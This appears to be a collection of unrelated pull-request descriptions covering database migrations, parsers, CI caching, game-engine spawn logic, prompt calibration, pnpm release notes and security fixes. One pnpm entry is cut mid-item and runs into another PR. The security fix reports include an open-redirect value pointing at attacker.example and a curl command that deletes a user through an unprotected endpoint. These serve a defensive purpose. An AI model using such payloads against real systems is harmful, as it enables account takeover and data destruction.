body: ## root_cause `Task.planDeliverableRefs` is a `String[]` of `PlanDeliverable.slug` values. The slug is the human-friendly identity, but it is also mutable — an owner renaming a deliverable inside the same plan version silently broke drift attribution (the slug array stayed stale) and made the upcoming R-154 graph-diff impossible because there was no stable row-id link between a task and its deliverables. ## fix_steps (from REMEDIATION_PLAN + what was actually done) 1. **New table `TaskDeliverableLink { taskId, deliverableId, createdAt }`** — added to `packages/api/prisma/schema.prisma` plus a new migration `20260524110000_add_task_deliverable_links` with FKs and an idempotent SQL backfill from existing `tasks.plan_deliverable_refs` slug arrays. 2. **Backfill** — the migration `INSERT … SELECT … JOIN plan_deliverables` resolves each existing slug against the task's bound plan version and inserts one link row per match (`ON CONFLICT DO NOTHING` keeps re-runs safe). 3. **`task_pack` joins through the new table** — new helper `packages/api/src/lib/task-deliverable-links.ts` exposes `fetchLinkedDeliverables` and `syncTaskDeliverableLinks`; `task-pack.ts` now returns `task.linkedDeliverables` (id+slug+title+status) and derives `task.planDeliverableRefs` from the live join when any link exists, so a `PlanDeliverable.slug` rename is immediately visible to MCP/CLI/Web consumers. The legacy slug array remains the fallback for pre-migration tasks (`linkedDeliverables.length === 0`). 4. **`drift-engine.refsFromTask` reads from the link table** — `runDriftScan` now `include`s `deliverableLinks.deliverable.slug`, and `refsFromTask` prefers those live slugs over the cached array. This is what unlocks R-154's deliverable-id-based graph diff. 5. **Write paths sync the link rows** — POST `/tasks` (inside the same transaction as the task `create`) and PATCH `/tasks/[taskId]` both call `syncTaskDeliverableLinks` whenever `planDeliverableRefs` is provided, keeping the two representations coherent. ## verification - New test file: `packages/api/tests/integration/r153-task-deliverable-links.test.ts` — **3 tests, all pass**: 1. `syncTaskDeliverableLinks` seeds one link row per resolvable slug on the bound plan. 2. `task_pack` surfaces the **renamed** slug after `PlanDeliverable.slug` is updated (the rename-survival invariant — the slug array, by itself, would still show the stale slug). 3. `runDriftScan` classifies severity using the **linked** slug, not the cached `planDeliverableRefs` column — exercises the new `refsFromTask` projection and verifies a deliverable removal still produces `severity='high'` / `structuralSeverity='breaking'` after a slug rename. - Full `bash scripts/test.sh` run locally on this branch: - `@plansync/api` — **128 test files, 969 passed, 1 skipped** (includes the 3 new R-153 tests). - `@plansync/cli`, `@plansync/mcp-server`, `@plansync/shared`, `@plansync/client-core`, `@plansync/integrations/github-action` — all green. - No regressions in `r135-task-pack-cross-project`, `drift.test.ts`, `r140-execution-gate`, `r051-drift-alerts-one-open-per-task`, or the structural-severity scenarios.

body:
## Description

Robustify the Store `ConfigDict` setup path for `global_segment_size` and `local_buffer_size`.

This PR keeps the existing numeric setup APIs unchanged and only updates `RealClient::setup_internal(ConfigDict)` to reuse the shared byte-size parser. Direct `store.setup({...})` calls now accept human-readable size strings such as `16MB` and `16 MB`, while explicit unsupported values such as `50%`, unknown units, and negative sizes fail fast with `INVALID_PARAMS`.

This also tightens the shared parser by rejecting negative size strings before conversion, so existing `string_to_byte_size()` callers no longer silently cast values such as `-5` into a huge unsigned integer.

This PR does not change the numeric pybind setup path: `store.setup(host, meta, global_segment_size, local_buffer_size, ...)` still takes `size_t` arguments, so string inputs there are rejected before reaching C++. Higher-level callers such as SGLang that use the numeric setup path still need to parse their own string config before calling Mooncake.

Percentage-based sizes remain out of scope for this PR.

Refs #903

Follow-up to #279 (knitr 1.51 parse fix). With the qr-footer parse error cleared, the Quarto Publish build advanced past file 2/10 and surfaced the **next** failure at file 4/10:

```
[ 4/10] vignettes/hover-popup-demo.qmd
Error in `loadNamespace()`: ! there is no package called 'pkgload'
  source(file.path(pkgload::pkg_path(), "R", "hover_popup_helper.R"))
Quitting from hover-popup-demo.qmd:102-111 [setup]
```

## Cause

`pkgload` is a dev-time tool and is **not** in the `quarto-publish.yaml` dependency list. The vignette (added by the hover-popup MVP, #246) used `pkgload::pkg_path()` to locate `R/hover_popup_helper.R`.

Both occurrences (setup chunk + doc example) → `source(here::here("R", "hover_popup_helper.R"))`. `here` is already a CI dependency and resolves to the repo root via the DESCRIPTION marker (per the `portable-paths` rule). `tt()` is not exported, so sourcing the helper remains the intended pattern.

## Verification (local)

From the `vignettes/` render dir under the dev shell: `here::here("R", "hover_popup_helper.R")` resolves to the repo-root helper, the file sources, and `tt()` produces the expected `<span class="tt" …>` markup.

- **Anomaly (1)**: `anomaly_isolation_score` (simplified univariate single-tree)

## Layout

Pure-math modules (`geo.rs`, `stats.rs`, `anomaly.rs`) hold algorithms — Welford variance, sorted-rank percentile, classical-decomposition seasonal, etc. — and have no async / I/O dependencies, so Rust callers can use them directly without the MCP serde round-trip.

Thin MCP wrappers in `*_tool.rs` / `stats_tools.rs` add JSON-schema validation, length / range guards, structured output, and a sprinkling of input-defence parsing helpers.

Nominatim shared client (`geo_nominatim.rs`) holds a slot-based `Mutex<Instant>` throttle that enforces the 1 req/s public-usage rule, sets a project-identifying `User-Agent`, and strips request URLs from error messages so query parameters can't leak into logs. `NOMINATIM_BASE_URL` env override for self-hosters.

## Numeric-cast lint allow

The pedantic clippy lints `cast_precision_loss` / `cast_possible_truncation` / `cast_sign_loss` are silenced at module level in `stats.rs`, `anomaly.rs`, and `stats_tools.rs`. Justification documented at the top of each file: input arrays are capped at 100k entries (well under f64's 2^53 mantissa), so the precision-loss case the lint warns about cannot occur, and the truncation cases only fire after explicit input-schema bounds checks (window ≤ values.length, max_lag < values.length, etc.).

## Test plan

- [x] `cargo fmt --check` — clean
- [x] `cargo clippy --release --all-targets -- -D warnings` — clean
- [x] `cargo test --release -p tools-utility` — 288 passed (+75 new)
- [x] `lineguard` — all 11 changed files pass
- [ ] Reviewer can invoke any of the 13 tools via the stdio shim and watch the JSON schema validate inputs
- [ ] Reviewer can stress-test the Nominatim throttle by firing two `geo_geocode` calls back-to-back and confirming the second waits ~1 s

Closes #69

body:
## Summary

Lands the encounter-enemy spawn pipeline:

- `Spawn` / `SpawnLocation` types + `spawn: Option<Spawn>` field on `CardMetadata`.
- `EventPattern::EnemySpawned` (bare; narrowing fields land with the first real listener).
- `Event::EnemySpawned` extended with `code` + `engaged_with` (no current consumers; safe to extend in place).
- `spawn_enemy` handler in `engine/dispatch.rs`, wired into `encounter_card_revealed`'s `CardType::Enemy` arm (replacing the #126 reject stub).
- `Location.code: CardCode` field (new) + `state.next_enemy_id: u32` counter (new).
- Pipeline regeneration of `crates/cards/src/generated/cards.rs` with `spawn: None` on every card.
- Synthetic spawn-bearing enemy (`SYNTH_ENEMY_CODE`) + canonical synth location code (`SYNTH_LOC_CODE`) in `synth_cards.rs`.
- Integration test (`crates/scenarios/tests/encounter_spawn.rs`) exercising the happy path + multi-investigator reject.

## Rules-reference citations

- **Engagement-on-spawn**, Rules Reference p.10: "Any time a ready unengaged enemy is at the same location as an investigator, it engages that investigator, and is placed in that investigator's threat area. If there are multiple investigators at the same location as a ready unengaged enemy, follow the enemy's prey instructions to determine which investigator is engaged."
- **Default spawn / encounter-card resolution order**, Rules Reference p.24: "If the encountered enemy has no spawn instruction, the enemy spawns engaged with the investigator encountering the card and is placed in that investigator's threat area." And: "1. Resolve any 'Revelation' effects on that card. 2. If it is an Enemy: …spawn instructions / default engagement…"

Both are quoted verbatim in `spawn_enemy`'s doc comment.

## Design notes

- `SpawnLocation::Specific(String)` reuses the `CardCode` namespace rather than introducing a new `LocationCode` newtype. Locations in Arkham are cards; the namespace is shared at the data level. YAGNI on the type-level distinction until a concrete consumer asks for it.
- `Location.code` is required (not `Option`). Every location at scenario setup time has a printed code; the synthetic fixture's location stamps `SYNTH_LOC_CODE` explicitly, and `test_location` defaults to \`"_test_loc_{id}"\`.
- Multi-investigator engagement-on-spawn rejects pointing at #128. #128's hunter-movement work shares the \`Prey\` resolution machinery; this PR's reject defers that work to #128 rather than build a single-use resolver.
- `Event::EnemySpawned` carries `code` and `engaged_with` denormalized. No companion `Event::EnemyEngaged` fires for the on-spawn engagement — first real "after an enemy engages" listener (Phase-7+) gets to add it.
- `spawn_enemy` hardcodes `fight: 1, evade: 1, attack_damage: 0, attack_horror: 0` because `CardMetadata` doesn't yet carry per-enemy combat stats. Synthetic enemy + Phase-4 demo don't enter combat; the first Phase-7+ PR with a combat-relevant spawned enemy extends `CardMetadata`.

## Test plan

- [x] Per-handler unit tests in `spawn_enemy_tests`: specific spawn engages drawer, zero-investigator location leaves unengaged, location-not-in-play rejects, default spawn places at drawer's location, no-location-for-drawer rejects, multi-investigator rejects pointing at #128, distinct ids minted.
- [x] Integration test in `crates/scenarios/tests/encounter_spawn.rs`: full \`apply()\` happy path + multi-investigator reject.
- [x] \`RUSTFLAGS="-D warnings" cargo test --all --all-features\` green.
- [x] \`cargo clippy --all-targets --all-features -- -D warnings\` green.
- [x] \`cargo fmt --check\` green.
- [x] \`RUSTDOCFLAGS="-D warnings" cargo doc --workspace --no-deps --all-features\` green.
- [x] \`cargo build -p web --target wasm32-unknown-unknown\` green.

Closes #127.

author: copilot
body:
This PR extends the existing DXF-only flow to support STEP/IGES in the same architectural path (factory → parser → shared draw model → viewer). It also adds a format-agnostic SVG export service so STEP geometry is converted/rendered with the same normalization and viewport behavior expected in the current UI.

- **Format routing + file support**
  - `TParserFactory` now routes both `ffStep` and `ffIges` to `TStepParser`.
  - File validation/extensions now include `.igs/.iges` in addition to `.step/.stp/.dxf`.
  - Open dialog filters updated to include STEP + IGES with auto-detection preserved.

- **STEP parser hardening + entity coverage**
  - Added STEP structure checks around `ISO-10303-21`, `HEADER`, `DATA`, and end marker handling.
  - Made DATA section discovery more robust (case-insensitive scan).
  - Added standalone `LINE` entity conversion (in addition to existing `CIRCLE`, `ARC/TRIMMED_CURVE`, `POLYLINE`, `EDGE`, and simplified surface/wireframe traversal).

- **Shared SVG export layer**
  - Introduced `ISvgExporter` in core interfaces.
  - Added `TSvgExporter` service to emit SVG from shared `TDrawShape` objects (line/circle/arc/polyline/path/ellipse/point/composite).
  - Keeps DXF and STEP decoupled by exporting from the common shape model, not format-specific parser internals.

- **Controller integration**
  - Injected `ISvgExporter` into `TDxfViewerController`.
  - On STEP/IGES load, controller generates SVG from parsed shapes/bounds and stores it (`LastGeneratedSvg`) for viewer/consumer usage.

- **Related cleanup**
  - Fixed file size retrieval implementation in `TFileService.GetFileSize`.
  - Updated README to reflect STEP/IGES support and new export module.

```pascal
case AFormat of
  TCadFileFormat.ffDxf:  Result := TDxfParser.Create;
  TCadFileFormat.ffIges: Result := TStepParser.Create;
  TCadFileFormat.ffStep: Result := TStepParser.Create;
end;
```

body: ## Bug and impact - Auth accepted `next=//attacker.example/...` because it only checked `startsWith('/')`, allowing an off-site redirect after login. - Authenticated users with a missing `profiles` row could complete onboarding but remain stuck in an account/onboarding loop because onboarding used `update()` and Supabase returns success for zero updated rows. - `selectWorker` trusted client-provided action arguments enough to select mismatched bids/workers or non-active jobs, risking corrupted job/bid state from crafted calls. ## Root cause - Redirect validation did not distinguish local paths from protocol-relative URLs. - Onboarding assumed the base profile row already existed. - Worker selection validated job ownership but not the bid/job/worker/status relationship. ## Fix - Added a shared `safeLocalPath` helper and used it in both server and client auth redirects. - Passed the authenticated user phone into onboarding and upserted the base profile by `id`. - Added server-side validation and guarded updates for active jobs and sent bids matching the selected worker. ## Validation - `npx tsc --noEmit` passes. - Redirect sanitizer smoke-tested for local paths, same-origin absolute URL, external absolute URL, and protocol-relative URL. - `npm run lint` still fails on pre-existing unrelated lint issues in `web/src/app/[locale]/jobs/page.tsx` and `web/src/app/actions/createBid.ts`.

body:
### Motivation

- Introduce robust role inheritance and deny overrides so effective permissions can be computed from parent roles and explicit denies.
- Eliminate plain-text password storage and tighten user/account handling for security and auditability.
- Harden tenant isolation (task assignment) and replace untyped settings updates with a typed contract to prevent invalid configs.
- Surface permission-aware UI so navigation and admin actions respect the backend permission model and reusable role templates.

### Description

- Extended `CompanyRole` model with `denied_permissions`, `parent_role_ids`, and `is_template`, and added `resolve_effective_permissions_for_role` to compute effective permissions with inheritance and deny overrides.
- Propagated resolver usage into `User.get_permissions` and the backend permission helpers (`PermissionChecker` and `has_permission`) so routes use effective permissions rather than raw stored lists.
- Reworked roles API (`/roles`) to use permission-based dependencies (`roles:manage`), added parent-role validation and cycle prevention, template support (list, clone, seed global templates), SaaS plan checks scoped to tenant/global templates, and return `effective_permissions` in responses.
- Removed unsafe `raw_password` storage from the `User` model and all creation/update flows in `user_service`, and removed `raw_password` from schemas/types and responses.
- Hardened task creation (`/tasks`) to check `tasks:create` and `tasks:assign` permissions, enforce tenant scoping when `for_all` or multi-assign is used, and prevent cross-tenant assignments.
- Replaced untyped settings update payload with `SettingsUpdateRequest` Pydantic model and use `model_dump(exclude_none=True)` to only persist explicit fields; enforce admin/super-admin access rules for company/global updates.
- Frontend changes: add `permissions` to user type, implement `hasPermission` in `AuthContext`, make admin sidebar and settings menu permission-aware, update roles UI to support templates, effective permissions display, and better error handling; improve login error messaging and API client base URL resolution, timeout, and network error logs.
- Added three documentation plans: `CUSTOMIZATION_ROADMAP.md`, `INDUSTRY_CUSTOMIZATION_MASTERPLAN.md`, and `LOGIC_GAPS_ANALYSIS.md` to capture roadmap, masterplan, and identified logic/security gaps and recommendations.

body:
**Draft until A/B evidence from Run #19 attempt 5 (Qwen3-Coder-30B via OpenRouter) lands.**

## Summary

Two-file prompt rewrite. Closes #777 and completes the calibration sweep for all five LLM-driven gate-bearing colonies in research-foundry (skeptic via #773, noticer + novelty via #775, auditor + reviewer here).

## Problem

Run #19 attempt 4 (post-#775) cascade analysis surfaced the next two gates that hadn't yet been calibrated:

- **Auditor**: 9 experience rows but **0 audit-ledger entries**. The audit-ledger only receives writes when the auditor produces a verdict; with the strict-anchor prompt, decisions biased toward `KNOWN_PRIOR` or `NEEDS_HUMAN` over `VERIFIED_NEW`, so no published audit verdicts.
- **Reviewer**: 7 experience rows, only 2 ctx writes, **0 actual approval outputs**. Same pattern — the strict-anchor prompt rejects on minor formatting differences between .tex claims and reproducibility stdout.

Both prompts opened with `"You are a strict X"` — identical anchor to pre-fix skeptic/noticer/novelty.

## Fix

Same template as #773 / #775 applied to both prompts:

| Element | Before | After |
|---------|--------|-------|
| Anchor | "strict X" | "CALIBRATED X — your job is to triage, not gatekeep" |
| Cost asymmetry | (implicit) | explicit: auditor — "false negatives drop the research / false positives waste reviewer compute"; reviewer — "false negatives block the submitter / false positives push hallucinations to publication" |
| Default when uncertain | restrictive label | permissive: `NEEDS_HUMAN` (auditor) / `approved` (reviewer) |
| Negative criterion | "strict" gating | "ONLY for near-EXACT direct match" (auditor `KNOWN_PRIOR`); "ONLY when central claim has no stdout support whatsoever, peripheral motivating remarks excluded" (reviewer `rejected`) |
| Positive criterion | conservative | "novel structural angle, even if touches classical territory" (auditor `VERIFIED_NEW`) |

Verdict-label vocabularies preserved unchanged:
- auditor: `{VERIFIED_NEW, VERIFIED_BY_LEAN, KNOWN_PRIOR, NEEDS_HUMAN}`
- reviewer: `{approved, rejected}`

Auditor's full domain logic (4 verdict criteria, Lean integration semantics, prior_advocate handling, HITL-reject signal usage) preserved unchanged — only the anchor + cost asymmetry + label-default framing changed.

## A/B plan (Run #19 attempt 5)

Single treatment run on Qwen3-Coder-30B via OpenRouter (~$0.22, ~75 min). Baseline is attempt 4 (post-#775) which already ran with the strict-anchor auditor/reviewer — that data is preserved.

Metrics to compare:
- auditor verdict distribution (NEEDS_HUMAN / KNOWN_PRIOR / VERIFIED_NEW / VERIFIED_BY_LEAN)
- audit-ledger row count (was 0 in attempt 4)
- reviewer approval rate (approved vs rejected)
- preprint-ledger row count (was 0 in attempt 4) — submitter is gated on reviewer approval
- PDFs end-to-end (was 3 in attempt 4)

If both gates open up as predicted, audit-ledger and preprint-ledger should show non-zero rows for the first time in any attempt.

## Test plan

- [ ] `colony-lint.sh` passes
- [ ] Treatment run completes 75 ticks on Qwen via OR
- [ ] A/B table posted as PR comment with audit-ledger + preprint-ledger lift
- [ ] CI green

## Out of scope (separate follow-ups)

- Mechanical math-correctness sanity gates ([#776](https://github.com/Replikanti/agentis-colonies/issues/776)) — orthogonal to prompt calibration
- Substrate primitive activation (`replicate/decide/evolve_self`) — still tier-locked, needs longer run (200-500 ticks)

author: olemarkus
body:
## Summary

PR #998 follow-up (TODO line 541). Pins two additional rescue-routing scenarios in `test/deferredObjectiveActivePlan.test.ts` so a future refactor of the replan-reason cascade cannot silently invert it.

The existing PR-998 regression suite already covers:
- "no rescue → some rescue" → `flow_permission_changed`
- "both → none" → `flow_permission_changed`
- target-change (rescue unchanged) → `objective_changed`
- both target + rescue change → `objective_changed`
- planStatus drift on identical hours (neither base nor rescue change) → `schedule_revised`

These two new tests close the remaining gaps:

- **`emits flow_permission_changed on a single-permission toggle when the other rescue permission stays granted`** — pre-state `rescue = { limitLowerPriorityDevices: 'always' }`, post-state `rescue = { exemptFromBudget: 'always', limitLowerPriorityDevices: 'always' }`. Mirrors the shape `withRescuePermission(entry, 'exemptFromBudget', 'always')` emits when the existing entry already carries `limitLowerPriorityDevices`. The `key === 'exemptFromBudget'` ternary in `withRescuePermission` keeps the non-targeted permission intact, so the recorder sees the rescue tail flip from `['rescue', null, 'always']` to `['rescue', 'always', 'always']` — `baseChanged = false`, `rescueChanged = true` → `rescueOnly = true` → `flow_permission_changed`.

- **`emits flow_permission_changed when a rescue toggle and a planStatus drift land in the same cycle`** — rescue permission flip + horizon `status: 'on_track' → 'at_risk'` simultaneously on identical hour buckets. The status drift alone would route to `schedule_revised` (covered by the negative test directly above it); here the rescue change forces `objectiveChanged = true` AND `rescueOnly = true`, so `resolveReplanReason` picks `flow_permission_changed` before falling through. A refactor that reordered the cascade (e.g. checked `metadataDriftedWithinSchedule` first) would silently swap the reasons and the history detail would name the wrong cause.

Test-only — no production code touched. All 7 cases in the `rescue-permission-only replan routing` describe block (5 existing + 2 new) pass; full `npm run ci:checks` and `npm run test:unit` clean.

## Test plan

- [x] `npx vitest run test/deferredObjectiveActivePlan.test.ts -t "rescue-permission-only replan routing" --no-coverage` — 7 passed
- [x] `npm run test:unit` — 3258 passed, 6 skipped
- [x] `npm run ci:checks` — lint + arch + deadcode + typecheck all green
- [x] Both new cases trace through `compareObjectiveSignatures` → `resolveReplanReason` with `rescueOnly = true` (verified mentally by reading `lib/plan/deferredObjectives/activePlanSignature.ts` + `replanReason.ts`)
- [x] Neither new case duplicates existing PR-998 coverage in the same describe block

Related: PR #998, TODO.md L541-558 (now marked `[x]` with the new test names).

body:
## Summary
Module entities with empty SourceFile are synthetic grouping nodes created by the module-grouping pass (Epic #1380). These structural markers have no incoming/outgoing semantic edges and were incorrectly counted as degree-0 orphans. Fixed by excluding Kind=Module with empty SourceFile from the orphan classifier.

## Root cause
The orphan-probe counted all degree-0 entities as orphans, but Module entities with empty SourceFile are intentional synthetic containers for grouping purposes, not real code constructs. This resulted in 17 false-positive orphans in the polyglot-platform group.

## Fix
Updated cmd/orphan-probe/main.go to skip Module entities where SourceFile is empty during orphan detection and clustering. These nodes remain in the graph (they serve a structural purpose) but are excluded from orphan metrics.

## Measurement
- polyglot-platform orphan count: 539 → 522 (reduction of 17)
- polyglot-platform orphan rate: 28.3% → 27.4%
- No other groups affected (Module orphans were polyglot-platform-only)

## Testing
- go test ./internal/extractors/... — all passed
- Manual validation: orphan-probe output confirms Module/(empty) cluster is no longer reported

## Impact
- Orphan rate metrics now accurately reflect real code connectivity issues
- Synthetic structural nodes no longer inflate false-positive orphan count

Closes #2064

author: cursor[bot]
body: ## Summary Three critical correctness bugs found and fixed: ### Bug 1: Unauthenticated access to user management endpoints (Security — Critical) **Impact:** Any network caller (no login required) could read any user's profile, deactivate accounts, or delete users entirely via `GET/PATCH/DELETE /api/users/[id]`. **Root cause:** The `GET`, `PATCH`, and `DELETE` handlers in `app/api/users/[id]/route.ts` had zero authentication checks. The middleware explicitly skips `/api/*` routes, so these endpoints were fully open. **Trigger scenario:** `curl -X DELETE https://app.example.com/api/users/1` would delete user #1. **Fix:** Added JWT token verification to GET; added JWT + admin role check (System Administrator / Strategy Manager) to PATCH and DELETE. ### Bug 2: Self-assignment bypass for "Department Head" role (Data Integrity — High) **Impact:** Users with the canonical `"Department Head"` role could assign tasks and subtasks to themselves, violating the separation-of-duties rule that HODs only assign to staff. **Root cause:** The self-assignment guard in `app/api/department-head/tasks/route.ts` only checked `role === 'hod' || role === 'unit head'` but missed `role === 'department head'`. The JWT stores the canonical role string from `pickDefaultActiveRole()`, which returns `"Department Head"` — lowercased to `"department head"` in the handler. This string doesn't match `'hod'` or `'unit head'`. **Trigger scenario:** A user with the "Department Head" role creates a task, sets `assigned_to` to their own user ID → succeeds (should be blocked). **Fix:** Added `|| role === 'department head'` to all three guard locations (POST single-assignee, POST subtask, PUT). ### Bug 3: Cross-department task assignment (Data Integrity — High) **Impact:** An HOD could assign tasks to staff in any department, breaking organizational boundaries and corrupting workload/performance reports. **Root cause:** The subtask assignment path validates each assignee's `department_id` against the HOD's visible departments. The single-assignee path (non-subtask) skipped this check entirely, accepting any user ID. Same gap in the PUT handler for reassignment. **Trigger scenario:** HOD of Department A creates a task with `assigned_to = ` → succeeds (should return 400). **Fix:** Added department membership validation for single-assignee creation (POST) and reassignment (PUT), matching the existing subtask validation pattern. ## Validation - TypeScript compilation passes (`tsc --noEmit` clean) - All lint warnings are pre-existing (`@typescript-eslint/no-explicit-any` throughout codebase) - Fixes are minimal and surgical — no refactors or unrelated changes

body:
This PR contains the following updates:

| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |
|---|---|---|---|
| [pnpm](https://pnpm.io) ([source](https://redirect.github.com/pnpm/pnpm/tree/HEAD/pnpm)) | [`11.2.2` → `11.3.0`](https://renovatebot.com/diffs/npm/pnpm/11.2.2/11.3.0) | ![age](https://developer.mend.io/api/mc/badges/age/npm/pnpm/11.3.0?slim=true) | ![confidence](https://developer.mend.io/api/mc/badges/confidence/npm/pnpm/11.2.2/11.3.0?slim=true) |

---

### Release Notes

<details>
<summary>pnpm/pnpm (pnpm)</summary>

### [`v11.3.0`](https://redirect.github.com/pnpm/pnpm/blob/HEAD/pnpm/CHANGELOG.md#1130)

[Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v11.2.2...v11.3.0)

##### Minor Changes

- Added `pnpm stage` with `publish`, `list`, `view`, `approve`, `reject`, and `download` subcommands for npm staged publishing.
- Added a new setting `trustLockfile`. When `true`, `pnpm install` skips the supply-chain verification pass that re-applies `minimumReleaseAge` / `trustPolicy='no-downgrade'` to every entry in the loaded lockfile. The install treats the lockfile as already-trusted — useful for closed-source projects where every commit comes from a trusted author. Defaults to `false`; verification stays on by default. Set in `pnpm-workspace.yaml`.

  Also cut the memory footprint of the verification pass itself: the per-(registry, name) trust-meta cache previously retained the full packument — dependency graphs, scripts, README, and per-version manifests — for the entire install. On large workspaces (`~4k` lockfile entries with `minimumReleaseAge` + `trustPolicy: no-downgrade` enabled) this could OOM CI runners with a 2GB heap cap. The cache now stores only the fields the trust check actually reads (`time`, per-version `_npmUser.trustedPublisher`, `dist.attestations.provenance`). The abbreviated-metadata cache is similarly projected to just the package-level `modified` field and the set of currently-listed version names. Fixes [#​11860](https://redirect.github.com/pnpm/pnpm/issues/11860).
- Implemented `pnpm pkg` command natively, following `npm pkg` standards.
- Implemented `pnpm repo` command natively, following `npm repo` standards.
- Implemented `pnpm set-script` (alias `ss`) natively. Adds or updates an entry in the `scripts` field of the project manifest, supporting `package.json`, `package.json5`, and `package.yaml` formats.
- Add a `skip-manifest-obfuscation` option for `pnpm pack` and `pnpm publish`. When enabled, the original `packageManager` field and publish lifecycle scripts are kept in the packed/published manifest instead of being stripped. The pnpm-specific `pnpm` field continues to be omitted.

##### Patch Changes

- Fixed `pnpm dlx` failing with `ERR_PNPM_NO_IMPORTER_MANIFEST_FOUND` when the installed package's CAS slot is missing its `package.json`. Observed in the wild for `pnpm dlx node@runtime:<version>` when the GVS slot was populated without the synthesized manifest runtime archives need (they don't ship a `package.json` of their own, so the synthesized one is the only way it gets there; an existing slot from an earlier code path that skipped the synthesis stays incomplete). The bin link itself is wired up from the resolution and remains valid, so `dlx` now falls back to the scopeless package name when the slot's manifest is unreadable — for single-bin packages (the dlx common case, including every `runtime:` spec) this matches what `manifest.bin` would have named. Multi-bin packages already require `--package=<spec> <bin>` to disambiguate and don't enter this code path.
- Fixed non-determinism in `pnpm dedupe` and `pnpm install` when a dependency graph contains packages with transitive peer dependencies on each other (e.g. `@aws-sdk/client-sts` and `@aws-sdk/client-sso-oidc`) and `auto-install-peers` is enabled. The lockfile no longer flips between two equally-valid forms across consecutive runs. The root cause was that `resolveDependencies` pushed onto its `pkgAddresses` / `postponedResolutionsQueue` arrays from inside `Promise.all`-spawned callbacks, so completion-order timing leaked into the array order and downstream cyclic-peer suffix assignment. Fixes [#​8155](https://redirect.github.com/pnpm/pnpm/issues/8155).
- Fixed a regression introduced by [#​11711](https://redirect.github.com/pnpm/pnpm/pull/11711) where `pnpm add <github-shorthand>` (and any other wanted-dependency whose alias can't be parsed from the user-supplied spec, e.g. tarball URLs or `pnpm/test-git-fetch#sha`) was silently dropped from the manifest update and from `pendingBuilds`. The alias-keyed lookup added in that PR couldn't find a `wantedDependency` whose `alias` was `undefined` at parse time but resolved to a package name only after fetching, so the entry never made it into `specsToUpsert`. Restored the original index-based pairing between `directDependencies` and `wantedDependencies`; the catalog-protocol preservation that PR was originally fixing is unaffected because it's driven by `rdd.catalogLookup.userSpecifiedBareSpecifier`, not by the lookup. ## Description

Agent thinking/reasoning traces were rendered with `selectable: false` inside `render_collapsible_text_block_section`, making it impossible for users to select or copy any part of the reasoning content—even after the response had fully streamed in.

author: fenio
body:
## Summary

Two compounding speedups for the two slow Nix-based CI jobs (Nix engine build ~17 min, bcachefs smoke ~36 min).

### (1) Paths filter on the Nix engine build

Moved the job out of `ci.yml` into its own `nix-engine-build.yml` with `paths:` triggering only on engine sources, the embedded flake template, `flake.nix`/`flake.lock`, the Rust toolchain pin, or this workflow itself. PRs that touch only WebUI, docs, or other unrelated files now skip the ~17-min Nix build entirely.

The job's display name stays **"Nix engine build (sandbox-visibility gate)"** so any branch-protection rules matching on the check name keep working.

`integration.yml`'s bcachefs-smoke already has an equivalent `paths:` filter (engine, nixos modules, nixos tests, `flake.nix`, `flake.lock`) — no change there.

### (2) Magic Nix Cache on both Nix-running jobs

`DeterminateSystems/magic-nix-cache-action@v13` uses the GitHub Actions cache as a Nix binary cache, layered on top of cachix. Cachix carries main-branch closures; Magic Nix Cache adds **per-branch incremental caching** across PR runs: when one Rust crate changes, only that crate + its downstream rebuilds, the rest substitutes from the Actions cache.

Free, no third-party service, works on forks (uses GHA's built-in OIDC for cache auth — `id-token: write` permission added on both workflows). Doesn't replace cachix — they serve different purposes (cachix: published main-branch closures available outside CI; Magic Nix Cache: PR-time incremental).

Realistic wins:

| Job | Cold | Warm |
|---|---|---|
| Nix engine build | ~17 min | ~5–8 min |
| bcachefs smoke | ~36 min | ~15 min (VM-boot ~10 min uncacheable) |

These two together should drop a typical engine-touching PR from ~36 min of wall-clock CI down to ~15 min, and a docs-only PR from ~17 min down to the cargo+npm gates (~2 min).

## Test plan

- [ ] On this PR itself: docs-only diff wouldn't normally trigger nix-engine-build, but this PR touches `.github/workflows/nix-engine-build.yml`, so the job DOES run once. After this merges, a follow-up docs-only PR should skip it cleanly.
- [ ] Magic Nix Cache first-run on this PR: no warm cache yet, so build time should be similar to today. The win shows up on the SECOND PR run (rebase, force-push, etc.) — the slow jobs should drop noticeably.
- [ ] Verify the job display name is unchanged (branch protection on "Nix engine build (sandbox-visibility gate)" still resolves).

author: yaront1111
body:
## Problem
`cordumctl edge claude` failed on Windows — `cordum-agentd` re-bound the loopback `127.0.0.1:<port>` the launcher reserved for socket-handle inheritance and exited before becoming ready (`bind: Only one usage of each socket address`), deterministically across random ports. Windows socket-handle inheritance across the agentd `exec.Cmd` path is unreliable in this build.

## Fix (Option A)
Flip `supportsAgentdListenerInheritance()` to `false` on **Windows only** (`listener_inheritance_windows.go`). The launcher then uses the close-then-bind legacy path (`reserveLoopbackHookURLLegacy`: `net.Listen` → `Close` → pass URL only, no `CORDUM_AGENTD_LISTENER_HANDLE` handoff) and `cordum-agentd` binds the freed port fresh. Unix/macOS keep listener inheritance — `listener_inheritance_unix.go` is untouched.

**Accepted tradeoff:** the small reserve→bind race window, identical to the existing Unix legacy fallback (loopback, same-user). Real Windows socket-handle passing (Option B) stays available via the dormant helpers; full removal of that code and the cordum-edge wrapper `--agentd-url` shim simplification are explicit follow-ups.

## Verification (real Windows 11 host)
- `cordumctl edge claude --dry-run` **without** `--agentd-url`, against the live gateway: edge session created across 4 random loopback ports (55009 / 54973 / 54977 / 49491), all `exit_code: 0`, zero bind errors.

body:
This pull request introduces several improvements and fixes to the game's UI and menu systems, enhances keyboard/gamepad navigation, and adds clearer game-over handling. The changes focus on improving menu accessibility, button labeling, event system reliability, and player feedback during win/loss scenarios. Additionally, there are minor gameplay and UI tweaks for better user experience.

**Menu System Improvements:**

* Refactored `MenuInputUtility` to ensure the presence of an `EventSystem` and `GraphicRaycaster` for all menus, added methods to find scene objects by name, and improved keyboard navigation logic for menu buttons. [[1]](diffhunk://#diff-a2d5a6593c7c7bfccf39a4bd9d7970fd9ef3f90e8c55c76e07198c698b15dec4R9-R10) [[2]](diffhunk://#diff-a2d5a6593c7c7bfccf39a4bd9d7970fd9ef3f90e8c55c76e07198c698b15dec4R76-R133) [[3]](diffhunk://#diff-a2d5a6593c7c7bfccf39a4bd9d7970fd9ef3f90e8c55c76e07198c698b15dec4R146-R147)
